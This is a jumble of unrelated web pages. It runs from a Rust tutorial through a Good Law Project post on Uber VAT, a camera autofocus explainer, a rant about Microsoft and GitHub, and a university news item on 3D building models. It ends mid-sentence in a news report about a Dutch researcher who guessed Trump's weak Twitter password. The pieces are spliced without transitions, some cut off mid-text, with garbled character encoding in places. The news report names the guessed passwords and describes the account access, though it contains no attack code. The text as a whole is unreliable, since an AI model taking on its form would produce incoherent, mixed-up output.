<p>At the time of writing (Oct 2020), I found Visual Studio Code with the <a href="https://marketplace.visualstudio.com/items?itemName=matklad.rust-analyzer" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a> extension to be the most reliable path. I learnt this only after naively installing the <a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust" target="_blank" rel="nofollow noopener noreferrer"><code>Rust</code></a> extension, which provides a front end for both the earlier <a href="https://github.com/rust-lang/rls" target="_blank" rel="nofollow noopener noreferrer"><code>RLS</code></a> and the more modern <a href="https://rust-analyzer.github.io/" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a>. However, in my experience, the native <code>rust-analyzer</code> extension was vastly superior.</p>
<h2 id="taste-testing-rusts-flavour">Taste Testing Rust's Flavour</h2>
<p>If you can express something as a type, the compiler can offer you guarantees about it. An expressive type system allows you to model domains that weren't possible before, often using simpler machinery too. Rust takes this affordance and runs with it. Types are used for everything, and I do mean <strong>everything</strong>. A lot of problems didn't quite make sense until I learnt to recognise them for what they were: type errors. </p>
<p>However, starting out, there are a few obvious differences I'd put into the "quirks" category. They seem foreign and strange, but acclimatisation comes quickly. I'll only briefly touch on them for those who've never seen Rust before. Exhaustive coverage exists in <a href="https://doc.rust-lang.org/book/ch05-00-structs.html" target="_blank" rel="nofollow noopener noreferrer">the Rust book</a> and <a href="https://fasterthanli.me/articles/i-am-a-java-csharp-c-or-cplusplus-dev-time-to-do-some-rust" target="_blank" rel="nofollow noopener noreferrer">elsewhere</a>.</p>
<p><strong> Rust doesn't have <code>classes</code> and only uses <code>structs</code>:</strong>   </p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>  </pre>
<p><em>"Cool cool. Structs are kinda like classes anyway"</em></p>
<p><strong>Methods are defined in <code>impl</code> blocks instead of the <code>struct</code> definition: </strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>

<span>impl</span> <span>MyData</span> <span>{</span>

	<span>pub</span> <span>fn</span> <span>init</span><span>(</span>x<span>:</span><span>f32</span><span>,</span> y<span>:</span><span>f32</span><span>,</span> z<span>:</span><span>f32</span><span>)</span><span>-&gt;</span> <span>MyData</span><span>{</span>
	
		
		<span>MyData</span><span>{</span>
			x<span>,</span>
			y<span>,</span>
			z<span>,</span>
		<span>}</span>
	<span>}</span>
<span>}</span></pre>
<p> <em>"Okay, separate <code>impl</code> blocks seem like a weird choice. Kinda reminds me of <code>C</code> header files..."</em></p>
<p> Calling methods defined in types is done with a <code>C++</code> like syntax, e.g. <code>Type::method_name()</code>. However, once an instance exists (aka memory has been allocated), members are accessed with regular dot syntax, e.g. <code>instance.method_name()</code>:</p>
<pre><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
    <span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span> 
    
    <span>let</span> y <span>=</span> position<span>.</span>y<span>;</span> 
<span>}</span></pre>
<p><strong>There's no inheritance. Shared behaviours are defined in <code>Traits</code>.</strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>


<span>trait</span> <span>Drawable</span> <span>{</span>
    <span>fn</span> <span>draw</span><span>(</span><span>&amp;</span><span>self</span><span>)</span><span>;</span>
<span>}</span>


<span>impl</span> <span>Drawable</span> <span>for</span> <span>MyData</span> <span>{</span>
	
	
	
    <span>fn</span> <span>draw</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>{</span>
        
    <span>}</span>
<span>}</span></pre>
<p><em>"Okay, so like <code>Trait</code> is just a different way to spell <code>Interface</code>? Gotcha. But no inheritance? That's pretty wild. But composition over inheritance, am I right?"</em></p>
<p>Now that we've implemented the <code>Drawable</code> Trait, we can call its methods on our struct: </p>
<pre><span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span>

position<span>.</span><span>draw</span><span>(</span><span>)</span><span>;</span> </pre>
<p>That's enough for now, but know there are other plenty of other commendable <a href="https://stevedonovan.github.io/rust-gentle-intro/2-structs-enums-lifetimes.html" target="_blank" rel="nofollow noopener noreferrer">type features</a>, some of which we'll discuss later.</p>
<h2 id="where-the-functional-rubber-meets-the-road">Where the Functional Rubber Meets the Road</h2>
<p>Giant monolithic classes are considered a code smell. A signal that responsibilities need to be separated into separate concerns. Still, OOP maintains the feeling of discrete units. Data and behaviour are contained within the cell walls of the class, or at least within the inheritance chain.   </p>
<p>Rust, by comparison, feels inside out, "itty bitty" and piecemeal. What might have been a single class is instead an accumulation of structs and traits, each defining their own narrow window into data and behaviour. <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank" rel="nofollow noopener noreferrer">In this talk</a>, the creator of Clojure, another functional language, describes this quality as "ad-hoc polymorphism". Using only what you need, when you need it. This granular approach maximises the immutable surface area, mutability is limited to where it's necessary.   </p>
<p>In the flame wars of "was OOP a giant mistake?", it's debatable whether <a href="https://stevedonovan.github.io/rust-gentle-intro/object-orientation.html" target="_blank" rel="nofollow noopener noreferrer">Rust allows you to write OOP code</a>. I understand this now not as a wholesale rejection: abstraction and encapsulation remain necessary tools. However, Rust forces you to leave behind features ardents consider harmful, inheritance being the obvious example. Call it "OOP, the good bits" if you will. </p>
<p>Ideas like composition over inheritance or separating data from behaviour have been around for a long time within the OOP world. However, FP encourages new principles, determinism and the avoidance of side effects. Let's look at an example. </p>
<h3 id="fixing-the-billion-dollar-mistake">Fixing the Billion Dollar Mistake</h3>
<p>Tony Hoare, the inventor of the null pointer called it <a href="https://en.wikipedia.org/wiki/Tony_Hoare#Apologies_and_retractions" target="_blank" rel="nofollow noopener noreferrer">his billion-dollar mistake</a>. Any programmer knows the misery of finding an error log littered with <code>Null Reference Exception</code>. But <code>null</code> values are fundamental, like the oxygen we breathe. Whenever I tried to contemplate an alternative I suffered a failure of imagination. <em>"No null values? Far out man."</em> </p>
<p>For a while, in prior languages, I attempted to answer this question by initialising variables with a default value instead of <code>null</code>. That worked when the default value meant something, otherwise, it just piped junk data into the system. Still, in successful cases, I began to appreciate the guarantee  it offered. Any downstream code could trust a variable would be valid and not have to muddy itself with unexpected exceptions.</p>
<p>Software is such that, unfortunately, there will always be cases where initialisation or access of a resource fails. FP provides us with a more complete answer here. It …</p></div></div>

            <div id="page">
                <p><span>Way back in April 2017, we announced we were going to take on HMRC’s</span> <a href="https://rebrand.ly/data-parliament-2017">failure to assess</a> <span>Uber to VAT which corroded public trust, not only in HMRC, but in politics more generally.Â&nbsp;</span></p>
<p><span>And itâ€™s been quite the scrap…Â&nbsp;</span></p>
<p><span>There have been lows – like us spending the money we raised in the crowdfunder trying to get a protective costs order and failing.Â&nbsp;</span></p>
<p><span>And there have been highs – like us persuading the High Court </span><a href="https://rebrand.ly/ewhc-2019"><span>late last year</span></a><span> that a fairly spineless HMRC was allowed to do what the legislation plainly allowed it to do and tell us it had (at last) assessed Uber.</span></p>
<p><span>There have been further lows – as last week when the Court of Appeal refused us permission to bring our judicial review against HMRC.</span></p>
<p><span><span>But ultimately </span><span>we triumphed</span><span>. </span></span><a href="https://rebrand.ly/ussec-10q"><span>Uber’s US accounts</span></a><span> now confirm that HMRC has assessed Uber to VAT on fares – both prospectively and retrospectively.</span></p>
<p><span>And thatâ€™s all we ever wanted.Â&nbsp;</span></p>
<p><span><span>It’s been a long, bumpy (and expensive) ride – if you’ll allow me the metaphor – but we have reached our destination. I am so proud that together we have forced HMRC, belatedly, to act – </span><span>Uber has now been asked to pay the Â£1.5bn of tax they owe the public purse.</span></span></p>
<p><span>We couldnâ€™t have done it without your support. So thank you.</span></p>
<p><span>Iâ€™d also like to thank the lawyers – George Peretz QC, Jack Anderson, Hui Ling McCarthy QC, Christopher Knight, David Greene, Vikram Sachdeva QC, and Alex Rook – who helped out, most for even less than the smell of an oily rag, along the way.</span></p>

<p><span>It is only with your support that we can continue to hold Government to account. If you would like to make a donation, you can do so</span>Â&nbsp;<a href="https://goodlawproject.org/membership">here</a>.</p>

Our designers were looking for the elements such as the thickness of the lines, sizes of the fonts, or spacing. While testing different styles, using several shades of gray, adding and removing elements, we’ve come to the conclusion that a <u>clear, simple design, using mostly black ink, was the best answer.

It's a decent, solid work desk but the default controller that it came with is poor, only allowing you to raise and lower via a set of small push-buttons.

In other words, to get into the "standing" position just enable the "up" relay for 5 seconds. To go back to "sitting" enable the "down" relay for 5 seconds.</p><p>This doesn't really work though. The desk lowers much more quickly than it raises (due to gravity) so it's very hard to get the correct timings. Furthermore you can easily get out-of-sync, meaning you have to manually adjust the height again, making the whole endeavour pointless (of course I only realised this once I had assembled everything).</p><p>A better approach is to use a height sensor. These are small little devices that send out a sound wave and measure how long it takes to return.

<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pryc-wp-acctp-original-content"><p>The focusing system your camera uses makes a big difference to its effectiveness. If you want to get the most out of your camera’s autofocus then it’s important to know how it works. It’s also helpful to understand the differences between phase detection and contrast detection autofocus (AF), as these are the two systems used in modern digital cameras.</p>
<p>For example, if you’re into portrait photography and like to use prime lenses and wide apertures then accurate focusing is critical. You need accurate autofocis to get the model’s eyes in focus in portraits like this one, taken at f1.2 with a 56mm lens.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-1.jpg" alt="Portrait of young woman taken with prime lens at a wide aperture using contrast detection autofocus" width="900" height="600" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-1.jpg"></p>
<p>The contrast detection used in mirrorless cameras is better at this than the phase detection used in digital SLR cameras.</p>
<p>If you don’t know why this is then read my article <a href="https://www.creative-photographer.com/focus-wide-apertures/">How to Focus at Wide Apertures</a>.</p>
<p>But if you’re into wildlife or sports photography, or anything that uses the AF tracking and continuous focusing abilities of your camera, then phase detection AF works better.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-2.jpg" alt="Photo of a knight riding a horse at a jousting tournament taken with a telephoto lens at a wide aperture using phase detection autofocus" width="900" height="692" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-2.jpg"></p>
<p>It should also be noted that cameras and lenses work together when it comes to AF performance. Both Canon and Nikon make high-performance super telephoto lenses that are designed to get the most out of the AF systems on their high-end cameras. That’s why so many professional sports photographers use one or the other.</p>
<p>Some cameras use a hybrid of the two systems. For example, a digital Single Lens Reflex (SLR) camera may use contrast detection AF in Live View or movie mode and phase detection AF when you look through the viewfinder.</p>
<p>Some mirrorless cameras also have phase detection AF points that work in continuous AF mode to improve AF tracking accuracy. But the mechanics of phase detection AF in mirrorless cameras is different to that in SLR cameras, as we will see further on in the article.</p>
<h2>Phase detection AF in SLR cameras</h2>
<p>In an SLR camera light passes through the lens, hits a reflex mirror and is reflected up through a pentaprism and out through the viewfinder. The aim of this type of camera design is to show you exactly what the lens is seeing in the viewfinder. It avoids the parallax errors you get at close focusing distances with rangefinder and twin lens reflex lens cameras.</p>
<p>The advantages this gave to photographers meant that the SLR camera became the camera design of choice for most photographers around 50 years ago. That has never been seriously challenged until the rise of mirrorless cameras. Many mirrorless cameras continue to use the SLR type design (with the electronic viewfinder in a hump in the center of the body) even though they are not, strictly speaking, SLR cameras as they don’t have a reflex mirror.</p>
<p>The centre of the camera’s mirror is translucent and a sub-mirror behind it reflects light down into the base of the camera body, where the AF sensor unit is positioned (the photo below shows the AF unit from the Canon EOS 50D). This is the heart of the phase detection AF system.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-5.jpg" alt="EOS 50D autofocus unit" width="600" height="410" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-5.jpg"></p>
<p>This diagram shows the paths of light through the camera body when the reflex mirror is in the down position. The mirror reflects light up into the pentaprism and out through the viewfinder. Some of the light is also reflected downwards towards the AF sensor.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-4.jpg" alt="Cut away image of digital SLR camera showing path of light through body and autofocus sensor" width="860" height="654" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-4.jpg"></p>
<p>The AF unit contains a sensor that correspond to the camera’s AF points. This is the AF sensor of the EOS 5D Mark III. The lines on the sensor match the camera’s AF point array.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-3.jpg" alt="EOS 5D Mark III autofocus sensor" width="860" height="645" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-3.jpg"></p>
<h2>Phase Detection AF in action</h2>
<p>In an SLR camera the light reflected from the sub-mirror is split into two separate images by prisms and microlenses in the AF sensor unit, each aimed at two lines on the AF sensor corresponding to the active AF point.</p>
<ul>
<li>If the images hit the two lines precisely, the subject is in focus.</li>
</ul>
<p>The distance between the two images tells the camera how much the lens is out of focus.</p>
<ul>
<li>If the two images are closer together, then the lens is focused in front of the subject.</li>
</ul>
<ul>
<li>If the two images are further apart, then the lens is focused behind the subject.</li>
</ul>
<p>The AF unit works out how far to move the lens to bring the subject into focus, and in which direction, then drives the lens to that position. It’s fast and (within limitations, see below) precise, making it ideal for tracking fast moving subjects.</p>
<h2>Limitations of phase detection AF</h2>
<p>These are the main limitations of phase detection AF.</p>
<p><strong>It doesn’t work as well in low light.</strong> The camera needs light to focus and the less of it there is, the more difficult accurate focus becomes. This applies to contrast detection AF as well.</p>
<p><strong>It may not be able to focus accurately on low contrast subjects.</strong> This also applies to contrast detection AF.</p>
<p><strong>You can’t put AF points close to the edge of the frame.</strong> The camera focuses with the lens set to its widest aperture, and the edges of the frame are always darker than the centre at this setting. Since phase detection AF doesn’t work well in low light, the vignetting makes it impractical to place AF points near the edge of the frame.</p>
<p><strong>It’s prone to errors when focusing using wide apertures.</strong> This is because phase detection AF is a partly mechanical process. The length of the light path from the lens to the AF sensor is theoretically the same as the length of the light path from the lens to the sensor.</p>
<p>But, in the real world, cameras and lenses are made to set tolerances. Such precision is too expensive and time consuming to achieve. If your particular camera and lens are at the extremes of their tolerance then it’s possible that the lens will focus slightly in front of or behind where the camera thinks it is focused.</p>
<p>This can result in focusing errors when using lenses at wide apertures (with their narrow depth of field). Most mid-range and high-end digital SLR lenses let you calibrate your lens to cancel out focusing errors.</p>
<p><strong>It doesn’t work in Live View or movie mode.</strong> The earliest SLR cameras with Live View had manual focus only in Live View and movie mode. Newer cameras use a combination of contrast detection AF and on sensor phase detection AF (see below) to achieve focus in Live View and movie mode.</p>
<h2>Sensor based phase detection AF</h2>
<p>Phase Detection AF forms part of a very accurate and precise autofocus system that allows high end SLR cameras to accurately track fast and erratically moving subjects.</p>
<p>But it doesn’t work in Live View or movie mode. In those modes, the camera’s mirror is flipped up to allow the light from the lens to reach the sensor in a continual feed. Light no longer reaches the autofocus unit.</p>
<p>This diagram shows the path of light through an SLR camera body in Live View or movie mode. The reflex mirror in the up position. The path is exactly the same through a mirrorless camera body.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-6.jpg" alt="Cut away image of digital SLR camera showing path of light through body of digital SLR system with reflex mirror in up position, in Live View" width="860" height="654" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-6.jpg"></p>
<p>Mirrorless cameras don’t have AF sensors. Instead they take a reading from the camera’s sensor. Digital SLRs also take readings from the sensor when in Live View or movie mode.</p>
<p>Different manufacturers tackle this in different ways. So let’s take a look at how Fujifilm and Canon do it.</p>
<p>Fujfilm achieved this by adding pixels that are masked so they only receive light from one side of the lens.</p>
<p>Under each phase detection AF point lie strips of covered sensors that receive light from one side of the lens, and other sensors that receive light from the other side. The camera compares both, and when they match, knows that the subject is in focus. If the subject is out of focus, it calculates how much it needs to adjust the lens to bring the subject into focus, and drives the lens there.</p>
<p>Reviews of Fujifilm’s system indicates that it works well, but is yet to achieve the speed and tracking accuracy of high end Canon and Nikon cameras.</p>
<p>Canon’s newest technology is called Dual Pixel CMOS AF. Each pixel on the camera’s sensor is made from two photo diodes. One diode gathers light, the other is used for phase detection AF. Canon uses this technology in movie mode, to help the camera track moving subjects while shooting video. It is also used in some M series mirrorless cameras.</p>
<h2>Contrast detection AF in mirrorless and SLR cameras</h2>
<p>Contrast detection AF works by analyzing pixels on the camera’s sensor. It works on the basis that the subject is in focus when contrast is highest. To find that point it has to push the focusing point of the lens back and forth.</p>
<p>As a result contrast detection AF is slower than phase detection AF. But it’s far more accurate at focusing on still subjects. There is no need to calibrate your lens as there are no mechanical focusing errors.</p>
<p>This relative lack of speed doesn’t really matter when shooting still subjects. But it makes a big difference when tracking moving subjects. Especially when you consider that the camera has to push and pull the lens to lock focus. That’s why camera manufacturers have come up with different solutions for implementing phase detection AF in mirrorless cameras and in digital SLRs in Live View or movie mode.</p>
<h2>Conclusion</h2>
<p>The topic of autofocus can get quite complex. Understanding it fully requires a depth of technological understanding that most photographers (myself included) don’t have. This article is a simplification of the basic principles. It should help you understand how different autofocus systems work, and what the pros and cons of each type are.

<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generation don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub, but of course I also have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of important Open Source code reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture so many things are turned into "crap"? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><div><div><p><span></span>Wednesday 21 October 2020</p><div data-autointrotext=""><p><b>In case of an emergency, first responders like the fire brigade need up-to-date information. 2D maps are a common source of information but they can be difficult to read in an emergency situation. UT PhD-student Shayan Nikoohemat created an algorithm that can accurately generate 3D models of the insides of large buildings from point clouds.</b></p><p>Indoor 3D models are the digital twins of building interiors. The 3D models could be used by first responders to get a good impression of large buildings, like shopping malls, a hospital or a sports complex, on their way to the emergency. 2D maps represent important information – like the location of emergency exits – on tangled floor plans, making them difficult too read quickly and after each reconstruction, these maps are outdated. “Sometimes, these maps are so outdated that the real building looks completely different than the floor plans. We need a fast and reliable approach to create the digital 3D model of interiors.”, says Shayan.</p><h2><a id="from-point-clouds-to-3d-map"></a>From point clouds to 3d map</h2><p>Luckily, laser scanners can quickly scan a whole building after every reconstruction. However, these scanners create point clouds, unstructured data which still has to be converted into a 3D model. The data doesn’t know if a scanned point is a wall, an exit or, for example, a table. According to Shayan, his program solved this: “For my PhD thesis, I created&nbsp;algorithms that automatically understand the data and can create 2D and 3D maps. We can detect and model doors, stairs, obstacles and navigable areas which are crucial data for the emergency planning.”</p><p><img src="https://1348661504.rsc.cdn77.org/.uc/ia68fda4b010288850e01584947034c146ab17af56d340701c4eb00bf0080/u4spzp0rofycx9foknvzw.png" alt="" width="235" height="191"><img src="https://1348661504.rsc.cdn77.org/.uc/i90ed1dbe010289850e01584947033c8b580b7352190d0701c4f300a40080/dmfesmsqurzdg6at3vcxgw.png" alt="" width="243" height="164"> </p><p><i>Figure 1: The point clouds and final 3D Model of the fire brigade building in Haaksbergen</i></p><h2><a id="recognizing-elements"></a>Recognizing elements</h2><p>The algorithm can recognize different structural elements such as walls, slabs, ceilings, and openings. Individual items like furniture, however, still pose a problem. “It is not yet able to correctly label everything, but the structural elements are enough to create an accurate map, which we tested on several real datasets,” he says. During his postdoc, he will further develop the system to also work for individual items. Huib Fransen of the Safety Region Rotterdam-Rijnmond was delighted with the results: “Shayan’s project is exciting for us and we were happy to provide him with the scanning sites for test cases.”&nbsp;</p><h2><a id="more-information"></a>MORE INFORMATION</h2><p>Shayan did his research and is now working as a postdoc at the Department of Earth Observation Sciences (EOS; Faculty ITC) and was supervised by Prof.Dr.Ir. M.G. Vosselman. His research project was initiated by the UT, TU Delft, and the Dutch FireBrigade (iNowit, Brandweer Nederland) and industry partners&nbsp;(CGI, Cyclomedia and Leap3D) and the Open Geospatial Consortium (OGC) to support disaster management in public buildings. The project was funded through&nbsp;<a href="http://maps4society.nl/">the NWO Partnership Programme Map4Society</a>. Shayan defended his PhD thesis, titled&nbsp;<i>Indoor 3D Reconstruction of Buildings from Point Clouds</i>, on 21 October.</p></div></div><div><div><p>K.W.

Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step 